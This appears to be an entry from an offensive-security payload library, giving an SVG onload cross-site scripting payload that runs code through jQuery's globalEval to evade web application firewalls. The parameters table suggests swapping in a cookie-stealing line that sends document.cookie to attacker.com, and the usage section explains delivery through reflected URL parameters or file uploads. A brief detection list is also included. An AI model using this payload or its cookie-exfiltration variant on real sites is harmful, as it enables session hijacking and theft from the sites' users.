---
type: code
language: HTML
verified: true
tags:
  - xss
  - waf-bypass
  - svg
  - payload
platforms:
  - Web
validated: true
---

# SVG-XSS-Payload-with-GlobalEval

## Code

```html
<svg onload=$.globalEval("alert()");>
```

## Description

This HTML snippet creates a minimal SVG element that executes JavaScript via an onload event handler. It uses jQuery's globalEval to run the alert function in the global context, enabling XSS in WAF-protected environments that allow SVG rendering but block direct scripts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert() | Placeholder for the malicious JavaScript; replace with custom code like document.location='http://attacker.com/steal?cookie='+document.cookie | alert(document.domain) |

## Usage

Embed this directly in a URL parameter for reflected XSS (e.g., <img src="data:image/svg+xml;base64,[base64-encoded-svg]" />) or save as .svg and upload to file upload endpoints. Requires jQuery to be present on the target page for globalEval; if not, adapt to native eval. Use in procedures like [[procedures/SVG-Alert-WAF-Bypass]] for WAF evasion.

## Detection

- WAF logs showing SVG uploads with onload attributes.
- Browser developer tools revealing eval execution or anomalous script loading.
- CSP violations if policy blocks unsafe-inline or eval.
- Network monitoring for data exfiltration if payload is adapted beyond alert.
